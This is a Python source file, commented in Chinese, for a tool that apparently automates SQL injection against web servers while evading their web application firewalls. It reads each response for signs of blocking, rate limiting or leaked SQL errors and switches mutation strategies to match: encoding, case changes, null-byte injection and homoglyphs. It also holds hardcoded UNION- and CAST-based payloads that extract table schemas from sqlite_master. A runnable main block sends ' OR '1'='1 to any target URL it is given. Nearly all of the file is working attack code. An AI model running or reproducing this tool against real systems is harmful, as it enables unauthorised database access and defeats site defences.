#!/usr/bin/env python3
"""
Ember WAF Oracle v2 — 响应反馈驱动的动态变异引擎。

核心思想 (来自 WAFMANCER Response Oracle Technology):
  不是盲目尝试所有变异,而是根据每次请求的响应特征,
  动态选择下一个最可能成功的变异策略。

Oracle 决策树:
  - 响应含 "blocked" / "forbidden" → 尝试编码绕过
  - 响应含 "SQL syntax" / "error"    → 注入已生效,尝试 UNION 提取
  - 响应长度 = 基线                    → payload 被完全过滤,尝试语义等价替换
  - 响应含 "captcha" / "rate limit"   → 切换速率或 user-agent
  - 响应 200 且无异常                  → 可能已绕过,验证用 analyzer

用法:
  from web.waf_oracle import WAFOracle
  oracle = WAFOracle()
  result = oracle.crack(sql_payload, send_fn)
"""

import re, time, json, sys, os
from typing import Dict, List, Callable, Tuple, Optional
from dataclasses import dataclass, field

# 本地导入: web 目录在项目根下
_PROJ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _PROJ)
from web.waf import WAFBypass


@dataclass
class OracleState:
    """Oracle 状态机 — 记录每次尝试的响应特征."""
    payload: str
    status: int
    body: str
    body_len: int
    elapsed: float
    waf_signature: Optional[str] = None
    strategy: str = "unknown"


class WAFOracle:
    """响应反馈驱动的 WAF 穿透引擎."""

    def __init__(self):
        self.base_bypass = WAFBypass()
        self.history: List[OracleState] = []
        self.baseline: Optional[OracleState] = None
        self.success_count = 0
        self.fail_count = 0

    def _classify_response(self, body: str, status: int) -> Tuple[str, List[str]]:
        """分类 WAF 响应,返回 (类别, 证据)."""
        b = body.lower()

        if "blocked" in b or "forbidden" in b or status == 403:
            return "waf_block", ["blocked/forbidden response"]
        if any(k in b for k in ["cloudflare", "akamai", "imperva", "f5", "mod_security"]):
            return "waf_identified", [w for w in ["cloudflare","akamai","imperva","f5","mod_security"] if w in b]
        if any(k in b for k in ["captcha", "rate limit", "too many requests"]):
            return "rate_limited", ["captcha/rate-limit detected"]
        if status == 429:
            return "rate_limited", ["HTTP 429"]
        if any(k in b for k in ["sql syntax", "sqlite", "mysql", "postgresql", "ora-", "unclosed quotation"]):
            return "sql_error_leak", ["SQL error disclosed — injection is working"]
        if any(k in b for k in ["stack trace", "traceback", "exception", "error in"]):
            return "app_error", ["application error disclosed"]
        if status == 200:
            return "passed", []
        if status >= 500:
            return "server_error", [f"HTTP {status}"]
        return "unknown", [f"status={status}"]

    def _choose_strategy(self, category: str, state: OracleState) -> str:
        """根据 WAF 响应类别选择下一个变异策略."""
        strategies = {
            "waf_block":       "encoding_bypass",      # WAF 拦截 → 尝试编码绕过
            "waf_identified":  "protocol_smuggling",   # 识别了WAF品牌 → HTTP 走私
            "rate_limited":    "identity_rotation",    # 限流 → 换 UA/IP
            "sql_error_leak":  "union_extract",        # 注入生效 → 直接提取
            "app_error":       "context_exploit",       # 应用报错 → 利用错误信息
            "passed":          "verify_bypass",         # 可能过了 → 验证
            "unknown":         "case_variation",        # 不清楚 → 随机变异
            "server_error":    "safe_retry",            # 500 → 用安全变体重试
        }
        return strategies.get(category, "random_mutation")

    def crack(self, original_payload: str,
              send_fn: Callable[[str], Tuple[int, str, float]],
              max_attempts: int = 30) -> Dict:
        """
        智能穿透 WAF — 响应驱动自适应。

        Args:
            original_payload: 原始注入 payload
            send_fn: 发送函数,返回 (status, body, elapsed)
            max_attempts: 最大尝试次数

        Returns:
            {"bypassed": bool, "attempts": int, "history": [...], "strategy_tree": {...}}
        """
        print(f"🧠 WAF Oracle: 自适应穿透 '{original_payload[:60]}...'")

        # 基线
        safe_status, safe_body, safe_time = send_fn("safe-test-baseline-123")
        self.baseline = OracleState("BASELINE", safe_status, safe_body,
                                     len(safe_body), safe_time)
        safe_len = len(safe_body)

        # 首试: 原始 payload
        status, body, elapsed = send_fn(original_payload)
        state = OracleState(original_payload, status, body, len(body), elapsed)
        category, evidence = self._classify_response(body, status)
        state.waf_signature = category
        self.history.append(state)

        if category == "passed":
            print(f"  ✅ 首试即绕过! (status={status})")
            return {"bypassed": True, "attempts": 1, "history": self._dump_history()}

        # 如果直接报 SQL 错误 — 注入已经生效,跳过绕过直接提取
        if category == "sql_error_leak":
            print(f"  ⚡ SQL 错误泄露 — 注入已生效 ({evidence[0]})")
            print(f"  跳过 WAF 绕过,直接进入数据提取阶段")
            return {"bypassed": True, "attempts": 1, "phase": "sqli_confirmed",
                    "skip_waf": True, "evidence": evidence,
                    "history": self._dump_history()}

        print(f"  ⚠️ WAF 检测: {category} ({', '.join(evidence)})")

        # 动态变异循环
        current_payload = original_payload
        strategies_tried: Dict[str, int] = {}
        strategy_tree: Dict[str, List[str]] = {}

        for attempt in range(1, max_attempts + 1):
            strategy = self._choose_strategy(category, state)
            strategies_tried[strategy] = strategies_tried.get(strategy, 0) + 1

            # 生成对应策略的变异
            variants = self._generate_strategy_variants(current_payload, strategy, count=3)

            for variant in variants:
                if variant == original_payload:
                    continue

                status, body, elapsed = send_fn(variant)
                state = OracleState(variant, status, body, len(body), elapsed)
                state.strategy = strategy
                category, evidence = self._classify_response(body, status)
                state.waf_signature = category
                self.history.append(state)

                # 记录策略效果
                if strategy not in strategy_tree:
                    strategy_tree[strategy] = []
                strategy_tree[strategy].append(f"{category}({status})")

                # 检查是否成功
                if category == "passed" or category == "sql_error_leak":
                    self.success_count += 1
                    print(f"  ✅ 绕过成功! (attempt {attempt+1}, strategy={strategy})")
                    print(f"     variant: {variant[:80]}...")
                    return {
                        "bypassed": True,
                        "attempts": attempt + 1,
                        "winning_strategy": strategy,
                        "variant": variant,
                        "strategy_tree": strategy_tree,
                        "history": self._dump_history(),
                    }

                # 进展检测: 响应长度显著变化 (>200bytes 差异)
                if abs(len(body) - safe_len) > 200:
                    print(f"  📏 响应长度异常 ({len(body)} vs baseline {safe_len}) — 可能部分绕过")
                    current_payload = variant  # 在这条路径上继续
                    break

                if attempt > 5 and attempt % 5 == 0:
                    print(f"  ... {attempt}/{max_attempts} 次尝试 (best: {category})")

                time.sleep(0.08)  # 礼貌间隔

            self.fail_count += 1

        return {
            "bypassed": False,
            "attempts": max_attempts,
            "strategies_tried": strategies_tried,
            "strategy_tree": strategy_tree,
            "history": self._dump_history(),
        }

    def _generate_strategy_variants(self, payload: str, strategy: str, count: int = 3) -> List[str]:
        """根据策略名生成对应变异."""
        if strategy == "encoding_bypass":
            return self.base_bypass.mutate(payload, count + 2)[:count]
        elif strategy == "case_variation":
            return [self.base_bypass._case_swap(payload),
                    self.base_bypass._whitespace_alt(payload),
                    self.base_bypass._comment_flood(payload)]
        elif strategy == "protocol_smuggling":
            return [self.base_bypass._null_byte_inject(payload),
                    self.base_bypass._unicode_homoglyph(payload)]
        elif strategy == "identity_rotation":
            # 在实际场景中加不同 User-Agent,这里做 payload 级轮换
            return [self.base_bypass._comment_flood(self.base_bypass._case_swap(payload))]
        elif strategy == "verify_bypass":
            return [payload]  # 已经可能过了,不再变异
        elif strategy == "union_extract":
            return ["' UNION SELECT sql FROM sqlite_master--",
                    "' UNION SELECT tbl_name FROM sqlite_master--",
                    "' UNION SELECT sql FROM sqlite_master WHERE type='table'--"]
        elif strategy == "context_exploit":
            return [f"1' AND 1=CAST((SELECT substr(sql,1,50) FROM sqlite_master LIMIT 1) AS INT)--",
                    f"1' AND 1=CAST((SELECT tbl_name FROM sqlite_master LIMIT 1) AS INT)--"]
        else:
            return self.base_bypass.mutate(payload, count + 2)[:count]

    def _dump_history(self) -> List[Dict]:
        return [{"attempt": i+1, "payload": h.payload[:80],
                 "status": h.status, "waf": h.waf_signature,
                 "len": h.body_len, "strategy": h.strategy}
                for i, h in enumerate(self.history)][:20]


if __name__ == "__main__":
    from urllib.request import Request, urlopen
    from urllib.parse import quote
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    path = sys.argv[2] if len(sys.argv) > 2 else "/rest/products/search"

    def send(variant: str) -> Tuple[int, str, float]:
        url = f"{target}{path}?q={quote(variant)}"
        t0 = time.monotonic()
        try:
            resp = urlopen(Request(url), timeout=5)
            return resp.status, resp.read().decode(errors="replace"), time.monotonic() - t0
        except Exception as e:
            return 0, str(e), time.monotonic() - t0

    oracle = WAFOracle()
    payload = "' OR '1'='1"
    result = oracle.crack(payload, send)

    print(f"\n{'═'*60}")
    print(json.dumps({k: v for k, v in result.items() if k != "history"},
                     indent=2, ensure_ascii=False))
